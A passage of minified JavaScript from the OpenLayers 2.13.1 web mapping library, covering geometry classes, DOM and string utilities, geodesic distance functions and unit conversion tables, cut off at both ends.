INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE \n * POSSIBILITY OF SUCH DAMAGE.\n */\nvar OpenLayers={VERSION_NUMBER:\"Release 2.13.1\",singleFile:!0,_getScriptLocation:function(){for(var a=/(^|(.*?\\/))(OpenLayers[^\\/]*?\\.js)(\\?|$)/,b=document.getElementsByTagName(\"script\"),c,d=\"\",e=0,f=b.length;e<f;e++)if(c=b[e].getAttribute(\"src\"))if(c=c.match(a)){d=c[1];break}return function(){return d}}(),ImgPath:\"\"};OpenLayers.Class=function(){var a=arguments.length,b=arguments[0],c=arguments[a-1],d=\"function\"==typeof c.initialize?c.initialize:function(){b.prototype.initialize.apply(this,arguments)};1<a?(a=[d,b].concat(Array.prototype.slice.call(arguments).slice(1,a-1),c),OpenLayers.inherit.apply(null,a)):d.prototype=c;return d};\nOpenLayers.inherit=function(a,b){var c=function(){};c.prototype=b.prototype;a.prototype=new c;var d,e,c=2;for(d=arguments.length;c<d;c++)e=arguments[c],\"function\"===typeof e&&(e=e.prototype),OpenLayers.Util.extend(a.prototype,e)};OpenLayers.Util=OpenLayers.Util||{};OpenLayers.Util.extend=function(a,b){a=a||{};if(b){for(var c in b){var d=b[c];void 0!==d&&(a[c]=d)}\"function\"==typeof window.Event&&b instanceof window.Event||(!b.hasOwnProperty||!b.hasOwnProperty(\"toString\"))||(a.toString=b.toString)}return a};OpenLayers.String={startsWith:function(a,b){return 0==a.indexOf(b)},contains:function(a,b){return-1!=a.indexOf(b)},trim:function(a){return a.replace(/^\\s\\s*/,\"\").replace(/\\s\\s*$/,\"\")},camelize:function(a){a=a.split(\"-\");for(var b=a[0],c=1,d=a.length;c<d;c++)var e=a[c],b=b+(e.charAt(0).toUpperCase()+e.substring(1));return b},format:function(a,b,c){b||(b=window);return a.replace(OpenLayers.String.tokenRegEx,function(a,e){for(var f,g=e.split(/\\.+/),h=0;h<g.length;h++){0==h&&(f=b);if(void 0===f)break;\nf=f[g[h]]}\"function\"==typeof f&&(f=c?f.apply(null,c):f());return\"undefined\"==typeof f?\"undefined\":f})},tokenRegEx:/\\$\\{([\\w.]+?)\\}/g,numberRegEx:/^([+-]?)(?=\\d|\\.\\d)\\d*(\\.\\d*)?([Ee]([+-]?\\d+))?$/,isNumeric:function(a){return OpenLayers.String.numberRegEx.test(a)},numericIf:function(a,b){var c=a;!0===b&&(null!=a&&a.replace)&&(a=a.replace(/^\\s*|\\s*$/g,\"\"));return OpenLayers.String.isNumeric(a)?parseFloat(a):c}};\nOpenLayers.Number={decimalSeparator:\".\",thousandsSeparator:\",\",limitSigDigs:function(a,b){var c=0;0<b&&(c=parseFloat(a.toPrecision(b)));return c},format:function(a,b,c,d){b=\"undefined\"!=typeof b?b:0;c=\"undefined\"!=typeof c?c:OpenLayers.Number.thousandsSeparator;d=\"undefined\"!=typeof d?d:OpenLayers.Number.decimalSeparator;null!=b&&(a=parseFloat(a.toFixed(b)));var e=a.toString().split(\".\");1==e.length&&null==b&&(b=0);a=e[0];if(c)for(var f=/(-?[0-9]+)([0-9]{3})/;f.test(a);)a=a.replace(f,\"$1\"+c+\"$2\");\n0==b?b=a:(c=1<e.length?e[1]:\"0\",null!=b&&(c+=Array(b-c.length+1).join(\"0\")),b=a+d+c);return b},zeroPad:function(a,b,c){for(a=a.toString(c||10);a.length<b;)a=\"0\"+a;return a}};\nOpenLayers.Function={bind:function(a,b){var c=Array.prototype.slice.apply(arguments,[2]);return function(){var d=c.concat(Array.prototype.slice.apply(arguments,[0]));return a.apply(b,d)}},bindAsEventListener:function(a,b){return function(c){return a.call(b,c||window.event)}},False:function(){return!1},True:function(){return!0},Void:function(){}};\nOpenLayers.Array={filter:function(a,b,c){var d=[];if(Array.prototype.filter)d=a.filter(b,c);else{var e=a.length;if(\"function\"!=typeof b)throw new TypeError;for(var f=0;f<e;f++)if(f in a){var g=a[f];b.call(c,g,f,a)&&d.push(g)}}return d}};OpenLayers.Bounds=OpenLayers.Class({left:null,bottom:null,right:null,top:null,centerLonLat:null,initialize:function(a,b,c,d){OpenLayers.Util.isArray(a)&&(d=a[3],c=a[2],b=a[1],a=a[0]);null!=a&&(this.left=OpenLayers.Util.toFloat(a));null!=b&&(this.bottom=OpenLayers.Util.toFloat(b));null!=c&&(this.right=OpenLayers.Util.toFloat(c));null!=d&&(this.top=OpenLayers.Util.toFloat(d))},clone:function(){return new OpenLayers.Bounds(this.left,this.bottom,this.right,this.top)},equals:function(a){var b=!1;null!=\na&&(b=this.left==a.left&&this.right==a.right&&this.top==a.top&&this.bottom==a.bottom);return b},toString:function(){return[this.left,this.bottom,this.right,this.top].join()},toArray:function(a){return!0===a?[this.bottom,this.left,this.top,this.right]:[this.left,this.bottom,this.right,this.top]},toBBOX:function(a,b){null==a&&(a=6);var c=Math.pow(10,a),d=Math.round(this.left*c)/c,e=Math.round(this.bottom*c)/c,f=Math.round(this.right*c)/c,c=Math.round(this.top*c)/c;return!0===b?e+\",\"+d+\",\"+c+\",\"+f:d+\n\",\"+e+\",\"+f+\",\"+c},toGeometry:function(){return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(this.left,this.bottom),new OpenLayers.Geometry.Point(this.right,this.bottom),new OpenLayers.Geometry.Point(this.right,this.top),new OpenLayers.Geometry.Point(this.left,this.top)])])},getWidth:function(){return this.right-this.left},getHeight:function(){return this.top-this.bottom},getSize:function(){return new OpenLayers.Size(this.getWidth(),this.getHeight())},\ngetCenterPixel:function(){return new OpenLayers.Pixel((this.left+this.right)/2,(this.bottom+this.top)/2)},getCenterLonLat:function(){this.centerLonLat||(this.centerLonLat=new OpenLayers.LonLat((this.left+this.right)/2,(this.bottom+this.top)/2));return this.centerLonLat},scale:function(a,b){null==b&&(b=this.getCenterLonLat());var c,d;\"OpenLayers.LonLat\"==b.CLASS_NAME?(c=b.lon,d=b.lat):(c=b.x,d=b.y);return new OpenLayers.Bounds((this.left-c)*a+c,(this.bottom-d)*a+d,(this.right-c)*a+c,(this.top-d)*a+\nd)},add:function(a,b){if(null==a||null==b)throw new TypeError(\"Bounds.add cannot receive null values\");return new OpenLayers.Bounds(this.left+a,this.bottom+b,this.right+a,this.top+b)},extend:function(a){if(a)switch(a.CLASS_NAME){case \"OpenLayers.LonLat\":this.extendXY(a.lon,a.lat);break;case \"OpenLayers.Geometry.Point\":this.extendXY(a.x,a.y);break;case \"OpenLayers.Bounds\":this.centerLonLat=null;if(null==this.left||a.left<this.left)this.left=a.left;if(null==this.bottom||a.bottom<this.bottom)this.bottom=\na.bottom;if(null==this.right||a.right>this.right)this.right=a.right;if(null==this.top||a.top>this.top)this.top=a.top}},extendXY:function(a,b){this.centerLonLat=null;if(null==this.left||a<this.left)this.left=a;if(null==this.bottom||b<this.bottom)this.bottom=b;if(null==this.right||a>this.right)this.right=a;if(null==this.top||b>this.top)this.top=b},containsLonLat:function(a,b){\"boolean\"===typeof b&&(b={inclusive:b});b=b||{};var c=this.contains(a.lon,a.lat,b.inclusive),d=b.worldBounds;d&&!c&&(c=d.getWidth(),\nd=Math.round((a.lon-(d.left+d.right)/2)/c),c=this.containsLonLat({lon:a.lon-d*c,lat:a.lat},{inclusive:b.inclusive}));return c},containsPixel:function(a,b){return this.contains(a.x,a.y,b)},contains:function(a,b,c){null==c&&(c=!0);if(null==a||null==b)return!1;a=OpenLayers.Util.toFloat(a);b=OpenLayers.Util.toFloat(b);var d=!1;return d=c?a>=this.left&&a<=this.right&&b>=this.bottom&&b<=this.top:a>this.left&&a<this.right&&b>this.bottom&&b<this.top},intersectsBounds:function(a,b){\"boolean\"===typeof b&&(b=\n{inclusive:b});b=b||{};if(b.worldBounds){var c=this.wrapDateLine(b.worldBounds);a=a.wrapDateLine(b.worldBounds)}else c=this;null==b.inclusive&&(b.inclusive=!0);var d=!1,e=c.left==a.right||c.right==a.left||c.top==a.bottom||c.bottom==a.top;if(b.inclusive||!e)var d=a.top>=c.bottom&&a.top<=c.top||c.top>a.bottom&&c.top<a.top,e=a.left>=c.left&&a.left<=c.right||c.left>=a.left&&c.left<=a.right,f=a.right>=c.left&&a.right<=c.right||c.right>=a.left&&c.right<=a.right,d=(a.bottom>=c.bottom&&a.bottom<=c.top||c.bottom>=\na.bottom&&c.bottom<=a.top||d)&&(e||f);if(b.worldBounds&&!d){var g=b.worldBounds,e=g.getWidth(),f=!g.containsBounds(c),g=!g.containsBounds(a);f&&!g?(a=a.add(-e,0),d=c.intersectsBounds(a,{inclusive:b.inclusive})):g&&!f&&(c=c.add(-e,0),d=a.intersectsBounds(c,{inclusive:b.inclusive}))}return d},containsBounds:function(a,b,c){null==b&&(b=!1);null==c&&(c=!0);var d=this.contains(a.left,a.bottom,c),e=this.contains(a.right,a.bottom,c),f=this.contains(a.left,a.top,c);a=this.contains(a.right,a.top,c);return b?\nd||e||f||a:d&&e&&f&&a},determineQuadrant:function(a){var b=\"\",c=this.getCenterLonLat(),b=b+(a.lat<c.lat?\"b\":\"t\");return b+=a.lon<c.lon?\"l\":\"r\"},transform:function(a,b){this.centerLonLat=null;var c=OpenLayers.Projection.transform({x:this.left,y:this.bottom},a,b),d=OpenLayers.Projection.transform({x:this.right,y:this.bottom},a,b),e=OpenLayers.Projection.transform({x:this.left,y:this.top},a,b),f=OpenLayers.Projection.transform({x:this.right,y:this.top},a,b);this.left=Math.min(c.x,e.x);this.bottom=Math.min(c.y,\nd.y);this.right=Math.max(d.x,f.x);this.top=Math.max(e.y,f.y);return this},wrapDateLine:function(a,b){b=b||{};var c=b.leftTolerance||0,d=b.rightTolerance||0,e=this.clone();if(a){for(var f=a.getWidth();e.left<a.left&&e.right-d<=a.left;)e=e.add(f,0);for(;e.left+c>=a.right&&e.right>a.right;)e=e.add(-f,0);c=e.left+c;c<a.right&&(c>a.left&&e.right-d>a.right)&&(e=e.add(-f,0))}return e},CLASS_NAME:\"OpenLayers.Bounds\"});\nOpenLayers.Bounds.fromString=function(a,b){var c=a.split(\",\");return OpenLayers.Bounds.fromArray(c,b)};OpenLayers.Bounds.fromArray=function(a,b){return!0===b?new OpenLayers.Bounds(a[1],a[0],a[3],a[2]):new OpenLayers.Bounds(a[0],a[1],a[2],a[3])};OpenLayers.Bounds.fromSize=function(a){return new OpenLayers.Bounds(0,a.h,a.w,0)};OpenLayers.Bounds.oppositeQuadrant=function(a){var b;b=\"\"+(\"t\"==a.charAt(0)?\"b\":\"t\");return b+=\"l\"==a.charAt(1)?\"r\":\"l\"};OpenLayers.Element={visible:function(a){return\"none\"!=OpenLayers.Util.getElement(a).style.display},toggle:function(){for(var a=0,b=arguments.length;a<b;a++){var c=OpenLayers.Util.getElement(arguments[a]),d=OpenLayers.Element.visible(c)?\"none\":\"\";c.style.display=d}},remove:function(a){a=OpenLayers.Util.getElement(a);a.parentNode.removeChild(a)},getHeight:function(a){a=OpenLayers.Util.getElement(a);return a.offsetHeight},hasClass:function(a,b){var c=a.className;return!!c&&RegExp(\"(^|\\\\s)\"+b+\"(\\\\s|$)\").test(c)},\naddClass:function(a,b){OpenLayers.Element.hasClass(a,b)||(a.className+=(a.className?\" \":\"\")+b);return a},removeClass:function(a,b){var c=a.className;c&&(a.className=OpenLayers.String.trim(c.replace(RegExp(\"(^|\\\\s+)\"+b+\"(\\\\s+|$)\"),\" \")));return a},toggleClass:function(a,b){OpenLayers.Element.hasClass(a,b)?OpenLayers.Element.removeClass(a,b):OpenLayers.Element.addClass(a,b);return a},getStyle:function(a,b){a=OpenLayers.Util.getElement(a);var c=null;if(a&&a.style){c=a.style[OpenLayers.String.camelize(b)];\nc||(document.defaultView&&document.defaultView.getComputedStyle?c=(c=document.defaultView.getComputedStyle(a,null))?c.getPropertyValue(b):null:a.currentStyle&&(c=a.currentStyle[OpenLayers.String.camelize(b)]));var d=[\"left\",\"top\",\"right\",\"bottom\"];window.opera&&(-1!=OpenLayers.Util.indexOf(d,b)&&\"static\"==OpenLayers.Element.getStyle(a,\"position\"))&&(c=\"auto\")}return\"auto\"==c?null:c}};OpenLayers.LonLat=OpenLayers.Class({lon:0,lat:0,initialize:function(a,b){OpenLayers.Util.isArray(a)&&(b=a[1],a=a[0]);this.lon=OpenLayers.Util.toFloat(a);this.lat=OpenLayers.Util.toFloat(b)},toString:function(){return\"lon=\"+this.lon+\",lat=\"+this.lat},toShortString:function(){return this.lon+\", \"+this.lat},clone:function(){return new OpenLayers.LonLat(this.lon,this.lat)},add:function(a,b){if(null==a||null==b)throw new TypeError(\"LonLat.add cannot receive null values\");return new OpenLayers.LonLat(this.lon+\nOpenLayers.Util.toFloat(a),this.lat+OpenLayers.Util.toFloat(b))},equals:function(a){var b=!1;null!=a&&(b=this.lon==a.lon&&this.lat==a.lat||isNaN(this.lon)&&isNaN(this.lat)&&isNaN(a.lon)&&isNaN(a.lat));return b},transform:function(a,b){var c=OpenLayers.Projection.transform({x:this.lon,y:this.lat},a,b);this.lon=c.x;this.lat=c.y;return this},wrapDateLine:function(a){var b=this.clone();if(a){for(;b.lon<a.left;)b.lon+=a.getWidth();for(;b.lon>a.right;)b.lon-=a.getWidth()}return b},CLASS_NAME:\"OpenLayers.LonLat\"});\nOpenLayers.LonLat.fromString=function(a){a=a.split(\",\");return new OpenLayers.LonLat(a[0],a[1])};OpenLayers.LonLat.fromArray=function(a){var b=OpenLayers.Util.isArray(a);return new OpenLayers.LonLat(b&&a[0],b&&a[1])};OpenLayers.Pixel=OpenLayers.Class({x:0,y:0,initialize:function(a,b){this.x=parseFloat(a);this.y=parseFloat(b)},toString:function(){return\"x=\"+this.x+\",y=\"+this.y},clone:function(){return new OpenLayers.Pixel(this.x,this.y)},equals:function(a){var b=!1;null!=a&&(b=this.x==a.x&&this.y==a.y||isNaN(this.x)&&isNaN(this.y)&&isNaN(a.x)&&isNaN(a.y));return b},distanceTo:function(a){return Math.sqrt(Math.pow(this.x-a.x,2)+Math.pow(this.y-a.y,2))},add:function(a,b){if(null==a||null==b)throw new TypeError(\"Pixel.add cannot receive null values\");\nreturn new OpenLayers.Pixel(this.x+a,this.y+b)},offset:function(a){var b=this.clone();a&&(b=this.add(a.x,a.y));return b},CLASS_NAME:\"OpenLayers.Pixel\"});OpenLayers.Size=OpenLayers.Class({w:0,h:0,initialize:function(a,b){this.w=parseFloat(a);this.h=parseFloat(b)},toString:function(){return\"w=\"+this.w+\",h=\"+this.h},clone:function(){return new OpenLayers.Size(this.w,this.h)},equals:function(a){var b=!1;null!=a&&(b=this.w==a.w&&this.h==a.h||isNaN(this.w)&&isNaN(this.h)&&isNaN(a.w)&&isNaN(a.h));return b},CLASS_NAME:\"OpenLayers.Size\"});OpenLayers.Console={log:function(){},debug:function(){},info:function(){},warn:function(){},error:function(){},userError:function(a){alert(a)},assert:function(){},dir:function(){},dirxml:function(){},trace:function(){},group:function(){},groupEnd:function(){},time:function(){},timeEnd:function(){},profile:function(){},profileEnd:function(){},count:function(){},CLASS_NAME:\"OpenLayers.Console\"};\n(function(){for(var a=document.getElementsByTagName(\"script\"),b=0,c=a.length;b<c;++b)if(-1!=a[b].src.indexOf(\"firebug.js\")&&console){OpenLayers.Util.extend(OpenLayers.Console,console);break}})();OpenLayers.Lang={code:null,defaultCode:\"en\",getCode:function(){OpenLayers.Lang.code||OpenLayers.Lang.setCode();return OpenLayers.Lang.code},setCode:function(a){var b;a||(a=\"msie\"==OpenLayers.BROWSER_NAME?navigator.userLanguage:navigator.language);a=a.split(\"-\");a[0]=a[0].toLowerCase();\"object\"==typeof OpenLayers.Lang[a[0]]&&(b=a[0]);if(a[1]){var c=a[0]+\"-\"+a[1].toUpperCase();\"object\"==typeof OpenLayers.Lang[c]&&(b=c)}b||(OpenLayers.Console.warn(\"Failed to find OpenLayers.Lang.\"+a.join(\"-\")+\" dictionary, falling back to default language\"),\nb=OpenLayers.Lang.defaultCode);OpenLayers.Lang.code=b},translate:function(a,b){var c=OpenLayers.Lang[OpenLayers.Lang.getCode()];(c=c&&c[a])||(c=a);b&&(c=OpenLayers.String.format(c,b));return c}};OpenLayers.i18n=OpenLayers.Lang.translate;OpenLayers.Util=OpenLayers.Util||{};OpenLayers.Util.getElement=function(){for(var a=[],b=0,c=arguments.length;b<c;b++){var d=arguments[b];\"string\"==typeof d&&(d=document.getElementById(d));if(1==arguments.length)return d;a.push(d)}return a};OpenLayers.Util.isElement=function(a){return!(!a||1!==a.nodeType)};OpenLayers.Util.isArray=function(a){return\"[object Array]\"===Object.prototype.toString.call(a)};OpenLayers.Util.removeItem=function(a,b){for(var c=a.length-1;0<=c;c--)a[c]==b&&a.splice(c,1);return a};\nOpenLayers.Util.indexOf=function(a,b){if(\"function\"==typeof a.indexOf)return a.indexOf(b);for(var c=0,d=a.length;c<d;c++)if(a[c]==b)return c;return-1};OpenLayers.Util.dotless=/\\./g;\nOpenLayers.Util.modifyDOMElement=function(a,b,c,d,e,f,g,h){b&&(a.id=b.replace(OpenLayers.Util.dotless,\"_\"));c&&(a.style.left=c.x+\"px\",a.style.top=c.y+\"px\");d&&(a.style.width=d.w+\"px\",a.style.height=d.h+\"px\");e&&(a.style.position=e);f&&(a.style.border=f);g&&(a.style.overflow=g);0<=parseFloat(h)&&1>parseFloat(h)?(a.style.filter=\"alpha(opacity=\"+100*h+\")\",a.style.opacity=h):1==parseFloat(h)&&(a.style.filter=\"\",a.style.opacity=\"\")};\nOpenLayers.Util.createDiv=function(a,b,c,d,e,f,g,h){var k=document.createElement(\"div\");d&&(k.style.backgroundImage=\"url(\"+d+\")\");a||(a=OpenLayers.Util.createUniqueID(\"OpenLayersDiv\"));e||(e=\"absolute\");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,g,h);return k};\nOpenLayers.Util.createImage=function(a,b,c,d,e,f,g,h){var k=document.createElement(\"img\");a||(a=OpenLayers.Util.createUniqueID(\"OpenLayersDiv\"));e||(e=\"relative\");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,null,g);h&&(k.style.display=\"none\",b=function(){k.style.display=\"\";OpenLayers.Event.stopObservingElement(k)},OpenLayers.Event.observe(k,\"load\",b),OpenLayers.Event.observe(k,\"error\",b));k.style.alt=a;k.galleryImg=\"no\";d&&(k.src=d);return k};OpenLayers.IMAGE_RELOAD_ATTEMPTS=0;\nOpenLayers.Util.alphaHackNeeded=null;OpenLayers.Util.alphaHack=function(){if(null==OpenLayers.Util.alphaHackNeeded){var a=navigator.appVersion.split(\"MSIE\"),a=parseFloat(a[1]),b=!1;try{b=!!document.body.filters}catch(c){}OpenLayers.Util.alphaHackNeeded=b&&5.5<=a&&7>a}return OpenLayers.Util.alphaHackNeeded};\nOpenLayers.Util.modifyAlphaImageDiv=function(a,b,c,d,e,f,g,h,k){OpenLayers.Util.modifyDOMElement(a,b,c,d,f,null,null,k);b=a.childNodes[0];e&&(b.src=e);OpenLayers.Util.modifyDOMElement(b,a.id+\"_innerImage\",null,d,\"relative\",g);OpenLayers.Util.alphaHack()&&(\"none\"!=a.style.display&&(a.style.display=\"inline-block\"),null==h&&(h=\"scale\"),a.style.filter=\"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='\"+b.src+\"', sizingMethod='\"+h+\"')\",0<=parseFloat(a.style.opacity)&&1>parseFloat(a.style.opacity)&&\n(a.style.filter+=\" alpha(opacity=\"+100*a.style.opacity+\")\"),b.style.filter=\"alpha(opacity=0)\")};OpenLayers.Util.createAlphaImageDiv=function(a,b,c,d,e,f,g,h,k){var l=OpenLayers.Util.createDiv();k=OpenLayers.Util.createImage(null,null,null,null,null,null,null,k);k.className=\"olAlphaImg\";l.appendChild(k);OpenLayers.Util.modifyAlphaImageDiv(l,a,b,c,d,e,f,g,h);return l};OpenLayers.Util.upperCaseObject=function(a){var b={},c;for(c in a)b[c.toUpperCase()]=a[c];return b};\nOpenLayers.Util.applyDefaults=function(a,b){a=a||{};var c=\"function\"==typeof window.Event&&b instanceof window.Event,d;for(d in b)if(void 0===a[d]||!c&&b.hasOwnProperty&&b.hasOwnProperty(d)&&!a.hasOwnProperty(d))a[d]=b[d];!c&&(b&&b.hasOwnProperty&&b.hasOwnProperty(\"toString\")&&!a.hasOwnProperty(\"toString\"))&&(a.toString=b.toString);return a};\nOpenLayers.Util.getParameterString=function(a){var b=[],c;for(c in a){var d=a[c];if(null!=d&&\"function\"!=typeof d){if(\"object\"==typeof d&&d.constructor==Array){for(var e=[],f,g=0,h=d.length;g<h;g++)f=d[g],e.push(encodeURIComponent(null===f||void 0===f?\"\":f));d=e.join(\",\")}else d=encodeURIComponent(d);b.push(encodeURIComponent(c)+\"=\"+d)}}return b.join(\"&\")};OpenLayers.Util.urlAppend=function(a,b){var c=a;if(b)var d=(a+\" \").split(/[?&]/),c=c+(\" \"===d.pop()?b:d.length?\"&\"+b:\"?\"+b);return c};\nOpenLayers.Util.getImagesLocation=function(){return OpenLayers.ImgPath||OpenLayers._getScriptLocation()+\"img/\"};OpenLayers.Util.getImageLocation=function(a){return OpenLayers.Util.getImagesLocation()+a};OpenLayers.Util.Try=function(){for(var a=null,b=0,c=arguments.length;b<c;b++){var d=arguments[b];try{a=d();break}catch(e){}}return a};\nOpenLayers.Util.getXmlNodeValue=function(a){var b=null;OpenLayers.Util.Try(function(){b=a.text;b||(b=a.textContent);b||(b=a.firstChild.nodeValue)},function(){b=a.textContent});return b};OpenLayers.Util.mouseLeft=function(a,b){for(var c=a.relatedTarget?a.relatedTarget:a.toElement;c!=b&&null!=c;)c=c.parentNode;return c!=b};OpenLayers.Util.DEFAULT_PRECISION=14;OpenLayers.Util.toFloat=function(a,b){null==b&&(b=OpenLayers.Util.DEFAULT_PRECISION);\"number\"!==typeof a&&(a=parseFloat(a));return 0===b?a:parseFloat(a.toPrecision(b))};\nOpenLayers.Util.rad=function(a){return a*Math.PI/180};OpenLayers.Util.deg=function(a){return 180*a/Math.PI};OpenLayers.Util.VincentyConstants={a:6378137,b:6356752.3142,f:1/298.257223563};\nOpenLayers.Util.distVincenty=function(a,b){for(var c=OpenLayers.Util.VincentyConstants,d=c.a,e=c.b,c=c.f,f=OpenLayers.Util.rad(b.lon-a.lon),g=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(a.lat))),h=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(b.lat))),k=Math.sin(g),g=Math.cos(g),l=Math.sin(h),h=Math.cos(h),m=f,n=2*Math.PI,p=20;1E-12<Math.abs(m-n)&&0<--p;){var q=Math.sin(m),r=Math.cos(m),s=Math.sqrt(h*q*h*q+(g*l-k*h*r)*(g*l-k*h*r));if(0==s)return 0;var r=k*l+g*h*r,t=Math.atan2(s,r),u=Math.asin(g*h*\nq/s),v=Math.cos(u)*Math.cos(u),q=r-2*k*l/v,w=c/16*v*(4+c*(4-3*v)),n=m,m=f+(1-w)*c*Math.sin(u)*(t+w*s*(q+w*r*(-1+2*q*q)))}if(0==p)return NaN;d=v*(d*d-e*e)/(e*e);c=d/1024*(256+d*(-128+d*(74-47*d)));return(e*(1+d/16384*(4096+d*(-768+d*(320-175*d))))*(t-c*s*(q+c/4*(r*(-1+2*q*q)-c/6*q*(-3+4*s*s)*(-3+4*q*q))))).toFixed(3)/1E3};\nOpenLayers.Util.destinationVincenty=function(a,b,c){var d=OpenLayers.Util,e=d.VincentyConstants,f=e.a,g=e.b,h=e.f,e=a.lon;a=a.lat;var k=d.rad(b);b=Math.sin(k);k=Math.cos(k);a=(1-h)*Math.tan(d.rad(a));var l=1/Math.sqrt(1+a*a),m=a*l,n=Math.atan2(a,k);a=l*b;for(var p=1-a*a,f=p*(f*f-g*g)/(g*g),q=1+f/16384*(4096+f*(-768+f*(320-175*f))),r=f/1024*(256+f*(-128+f*(74-47*f))),f=c/(g*q),s=2*Math.PI;1E-12<Math.abs(f-s);)var t=Math.cos(2*n+f),u=Math.sin(f),v=Math.cos(f),w=r*u*(t+r/4*(v*(-1+2*t*t)-r/6*t*(-3+4*\nu*u)*(-3+4*t*t))),s=f,f=c/(g*q)+w;c=m*u-l*v*k;g=Math.atan2(m*v+l*u*k,(1-h)*Math.sqrt(a*a+c*c));b=Math.atan2(u*b,l*v-m*u*k);k=h/16*p*(4+h*(4-3*p));t=b-(1-k)*h*a*(f+k*u*(t+k*v*(-1+2*t*t)));Math.atan2(a,-c);return new OpenLayers.LonLat(e+d.deg(t),d.deg(g))};\nOpenLayers.Util.getParameters=function(a,b){b=b||{};a=null===a||void 0===a?window.location.href:a;var c=\"\";if(OpenLayers.String.contains(a,\"?\"))var d=a.indexOf(\"?\")+1,c=OpenLayers.String.contains(a,\"#\")?a.indexOf(\"#\"):a.length,c=a.substring(d,c);for(var d={},c=c.split(/[&;]/),e=0,f=c.length;e<f;++e){var g=c[e].split(\"=\");if(g[0]){var h=g[0];try{h=decodeURIComponent(h)}catch(k){h=unescape(h)}g=(g[1]||\"\").replace(/\\+/g,\" \");try{g=decodeURIComponent(g)}catch(l){g=unescape(g)}!1!==b.splitArgs&&(g=g.split(\",\"));\n1==g.length&&(g=g[0]);d[h]=g}}return d};OpenLayers.Util.lastSeqID=0;OpenLayers.Util.createUniqueID=function(a){a=null==a?\"id_\":a.replace(OpenLayers.Util.dotless,\"_\");OpenLayers.Util.lastSeqID+=1;return a+OpenLayers.Util.lastSeqID};OpenLayers.INCHES_PER_UNIT={inches:1,ft:12,mi:63360,m:39.37,km:39370,dd:4374754,yd:36};OpenLayers.INCHES_PER_UNIT[\"in\"]=OpenLayers.INCHES_PER_UNIT.inches;OpenLayers.INCHES_PER_UNIT.degrees=OpenLayers.INCHES_PER_UNIT.dd;OpenLayers.INCHES_PER_UNIT.nmi=1852*OpenLayers.INCHES_PER_UNIT.m;\nOpenLayers.METERS_PER_INCH=0.0254000508001016;\nOpenLayers.Util.extend(OpenLayers.INCHES_PER_UNIT,{Inch:OpenLayers.INCHES_PER_UNIT.inches,Meter:1/OpenLayers.METERS_PER_INCH,Foot:0.3048006096012192/OpenLayers.METERS_PER_INCH,IFoot:0.3048/OpenLayers.METERS_PER_INCH,ClarkeFoot:0.3047972651151/OpenLayers.METERS_PER_INCH,SearsFoot:0.30479947153867626/OpenLayers.METERS_PER_INCH,GoldCoastFoot:0.3047997101815088/OpenLayers.METERS_PER_INCH,IInch:0.0254/OpenLayers.METERS_PER_INCH,MicroInch:2.54E-5/OpenLayers.METERS_PER_INCH,Mil:2.54E-8/OpenLayers.METERS_PER_INCH,\nCentimeter:0.01/OpenLayers.METERS_PER_INCH,Kilometer:1E3/OpenLayers.METERS_PER_INCH,Yard:0.9144018288036576/OpenLayers.METERS_PER_INCH,SearsYard:0.914398414616029/OpenLayers.METERS_PER_INCH,IndianYard:0.9143985307444408/OpenLayers.METERS_PER_INCH,IndianYd37:0.91439523/OpenLayers.METERS_PER_INCH,IndianYd62:0.9143988/OpenLayers.METERS_PER_INCH,IndianYd75:0.9143985/OpenLayers.METERS_PER_INCH,IndianFoot:0.30479951/OpenLayers.METERS_PER_INCH,IndianFt37:0.30479841/OpenLayers.METERS_PER_INCH,IndianFt62:0.3047996/\nOpenLayers.METERS_PER_INCH,IndianFt75:0.3047995/OpenLayers.METERS_PER_INCH,Mile:1609.3472186944373/OpenLayers.METERS_PER_INCH,IYard:0.9144/OpenLayers.METERS_PER_INCH,IMile:1609.344/OpenLayers.METERS_PER_INCH,NautM:1852/OpenLayers.METERS_PER_INCH,\"Lat-66\":110943.31648893273/OpenLayers.METERS_PER_INCH,\"Lat-83\":110946.25736872235/OpenLayers.METERS_PER_INCH,Decimeter:0.1/OpenLayers.METERS_PER_INCH,Millimeter:0.001/OpenLayers.METERS_PER_INCH,Dekameter:10/OpenLayers.METERS_PER_INCH,Decameter:10/OpenLayers.METERS_PER_INCH,\nHectometer:100/OpenLayers.METERS_PER_INCH,GermanMeter:1.0000135965/OpenLayers.METERS_PER_INCH,CaGrid:0.999738/OpenLayers.METERS_PER_INCH,ClarkeChain:20.1166194976/OpenLayers.METERS_PER_INCH,GunterChain:20.11684023368047/OpenLayers.METERS_PER_INCH,BenoitChain:20.116782494375872/OpenLayers.METERS_PER_INCH,SearsChain:20.11676512155/OpenLayers.METERS_PER_INCH,ClarkeLink:0.201166194976/OpenLayers.METERS_PER_INCH,GunterLink:0.2011684023368047/OpenLayers.METERS_PER_INCH,BenoitLink:0.20116782494375873/OpenLayers.METERS_PER_INCH,\nSearsLink:0.2011676512155/OpenLayers.METERS_PER_INCH,Rod:5.02921005842012/OpenLayers.METERS_PER_INCH,IntnlChain:20.1168/OpenLayers.METERS_PER_INCH,IntnlLink:0.201168/OpenLayers.METERS_PER_INCH,Perch:5.02921005842012/OpenLayers.METERS_PER_INCH,Pole:5.02921005842012/OpenLayers.METERS_PER_INCH,Furlong:201.1684023368046/OpenLayers.METERS_PER_INCH,Rood:3.778266898/OpenLayers.METERS_PER_INCH,CapeFoot:0.3047972615/OpenLayers.METERS_PER_INCH,Brealey:375/OpenLayers.METERS_PER_INCH,M